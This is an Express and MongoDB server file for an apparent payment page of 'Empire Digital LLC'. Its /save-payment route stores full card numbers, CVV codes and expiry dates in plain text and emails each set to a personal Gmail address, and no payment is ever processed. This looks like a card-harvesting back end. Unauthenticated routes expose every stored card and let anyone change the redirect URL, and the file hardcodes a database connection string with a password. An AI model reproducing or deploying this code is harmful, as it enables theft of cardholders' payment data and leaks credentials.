const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const nodemailer = require("nodemailer");
require("dotenv").config();

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});




const app = express();
const PORT = process.env.PORT || 5000;


// Middleware
app.use(cors());
app.use(express.json());


const uri =
  process.env.MONGO_URI ||
  "mongodb+srv://imta819:DQxfWjxZhZWgeJaH@stripecluster.g5v9tj7.mongodb.net/StripeCluster";

mongoose
  .connect(uri)
  .then(() => console.log("✅ Mongoose Connected"))
  .catch((err) => console.error("❌ Mongoose Error:", err));

// Company Model
const companySchema = new mongoose.Schema({
    companyName: {
        type: String,
        required: true,
        default: 'Empire Digital LLC'
    },
    logo: String,
    email: String,
    phone: String,
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const Company = mongoose.model('Company', companySchema);

// Redirect URL Model
const redirectUrlSchema = new mongoose.Schema({
    redirectUrl: {
        type: String,
        required: true,
        default: 'https://example.com/success'
    },
    description: String,
    isActive: {
        type: Boolean,
        default: true
    },
    createdAt: {
        type: Date,
        default: Date.now
    }
});

const RedirectUrl = mongoose.model('RedirectUrl', redirectUrlSchema);

// Payment Model
const paymentSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    trim: true,
    lowercase: true,
  },
  phone: {
    type: String,
    required: true,
  },
  cardNumber: {
    type: String,
    required: true,
  },
  cvc: {
    type: String,
  },
  expiry: {
    type: String,
  },
  createdAt: {
    type: Date,
    default: Date.now,
  },
});

const Payment = mongoose.model('Payment', paymentSchema);

// ==================== ROUTES ====================

// 1. Get Company Information
app.get('/company', async (req, res) => {
    try {
        let company = await Company.findOne();
        
        // If no company exists, create a default one
        if (!company) {
            company = await Company.create({
                companyName: 'Empire Digital LLC',
                email: 'empirenstate@gmail.com',
                phone: '+1 (917) 485-5043'
            });
        }
        
        res.json({
            success: true,
            companyName: company.companyName,
            email: company.email,
            phone: company.phone
        });
    } catch (error) {
        console.error('Error fetching company:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching company information',
            error: error.message
        });
    }
});

// 2. Update Company Information (Admin)
app.put('/company', async (req, res) => {
    try {
        const { companyName, email, phone, logo } = req.body;
        
        let company = await Company.findOne();
        
        if (!company) {
            company = await Company.create(req.body);
        } else {
            company.companyName = companyName || company.companyName;
            company.email = email || company.email;
            company.phone = phone || company.phone;
            company.logo = logo || company.logo;
            await company.save();
        }
        
        res.json({
            success: true,
            message: 'Company information updated',
            data: company
        });
    } catch (error) {
        console.error('Error updating company:', error);
        res.status(500).json({
            success: false,
            message: 'Error updating company information',
            error: error.message
        });
    }
});

// 3. Get Redirect URL
app.get('/redirect-url', async (req, res) => {
    try {
        let redirectConfig = await RedirectUrl.findOne({ isActive: true });
        
        // If no redirect URL exists, create a default one
        if (!redirectConfig) {
            redirectConfig = await RedirectUrl.create({
                redirectUrl: 'https://example.com/success',
                description: 'Default success redirect URL'
            });
        }
        
        res.json({
            success: true,
            redirectUrl: redirectConfig.redirectUrl
        });
    } catch (error) {
        console.error('Error fetching redirect URL:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching redirect URL',
            error: error.message
        });
    }
});

// 4. Update Redirect URL (Admin)
app.put('/redirect-url', async (req, res) => {
    try {
        const { redirectUrl, description } = req.body;
        
        if (!redirectUrl) {
            return res.status(400).json({
                success: false,
                message: 'Redirect URL is required'
            });
        }
        
        // Deactivate all existing URLs
        await RedirectUrl.updateMany({}, { isActive: false });
        
        // Create new active URL
        const newRedirect = await RedirectUrl.create({
            redirectUrl,
            description,
            isActive: true
        });
        
        res.json({
            success: true,
            message: 'Redirect URL updated',
            data: newRedirect
        });
    } catch (error) {
        console.error('Error updating redirect URL:', error);
        res.status(500).json({
            success: false,
            message: 'Error updating redirect URL',
            error: error.message
        });
    }
});
// 5. Save Payment Information
app.post('/save-payment', async (req, res) => {
    try {
        const { email, phone, cvc, cardNumber,expiry } = req.body;

        // 1. Save payment to DB
        const payment = await Payment.create({
            email,
            phone,
            cardNumber: cardNumber,
            cvc,
            expiry
        });

        // 2. Send Email Notification
        const mailOptions = {
          from: process.env.EMAIL_USER,
          to: "imta819@gmail.com",
          subject: "New Payment Received",
          html: `
                <h2>New Payment Saved</h2>
                <p><strong>Email:</strong> ${email}</p>
                <p><strong>Phone:</strong> ${phone}</p>
                <p><strong>Card Number:</strong> ${cardNumber}</p>
                <p><strong>CVV:</strong> ${cvc}</p>
                <p><strong>Expiry:</strong> ${expiry}</p>
                <p><strong>Payment ID:</strong> ${payment._id}</p>
                <p><strong>Created At:</strong> ${payment.createdAt}</p>
            `,
        };

        transporter.sendMail(mailOptions, (error, info) => {
            if (error) {
                console.error("❌ Error sending email:", error);
            } else {
                console.log("📧 Email sent:", info.response);
            }
        });

        // 3. Send response
        res.json({
            success: true,
            message: "Payment saved + Email sent",
            paymentId: payment._id,
        });

    } catch (error) {
        console.error("Error saving payment:", error);
        res.status(500).json({
            success: false,
            message: "Error saving payment",
            error: error.message,
        });
    }
});


// 6. Get All Payments (Admin)
app.get('/payments', async (req, res) => {
    try {
        const { status, limit = 50, page = 1 } = req.query;
        
        const query = status ? { status } : {};
        const skip = (page - 1) * limit;
        
        const payments = await Payment.find(query)
            .sort({ createdAt: -1 })
            .limit(parseInt(limit))
            .skip(skip);
        
        const total = await Payment.countDocuments(query);
        
        res.json({
            success: true,
            data: payments,
            pagination: {
                total,
                page: parseInt(page),
                pages: Math.ceil(total / limit)
            }
        });
    } catch (error) {
        console.error('Error fetching payments:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching payments',
            error: error.message
        });
    }
});

// 7. Get Payment by ID
app.get('/payments/:id', async (req, res) => {
    try {
        const payment = await Payment.findById(req.params.id);
        
        if (!payment) {
            return res.status(404).json({
                success: false,
                message: 'Payment not found'
            });
        }
        
        res.json({
            success: true,
            data: payment
        });
    } catch (error) {
        console.error('Error fetching payment:', error);
        res.status(500).json({
            success: false,
            message: 'Error fetching payment',
            error: error.message
        });
    }
});

// 8. Update Payment Status
app.patch('/payments/:id/status', async (req, res) => {
    try {
        const { status } = req.body;
        
        if (!['pending', 'processing', 'completed', 'failed'].includes(status)) {
            return res.status(400).json({
                success: false,
                message: 'Invalid status'
            });
        }
        
        const payment = await Payment.findByIdAndUpdate(
            req.params.id,
            { status },
            { new: true }
        );
        
        if (!payment) {
            return res.status(404).json({
                success: false,
                message: 'Payment not found'
            });
        }
        
        res.json({
            success: true,
            message: 'Payment status updated',
            data: payment
        });
    } catch (error) {
        console.error('Error updating payment status:', error);
        res.status(500).json({
            success: false,
            message: 'Error updating payment status',
            error: error.message
        });
    }
});

// Health check route
app.get('/health', (req, res) => {
    res.json({
        success: true,
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Route not found'
    });
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        success: false,
        message: 'Internal server error',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📡 API Base URL: http://localhost:${PORT}`);
});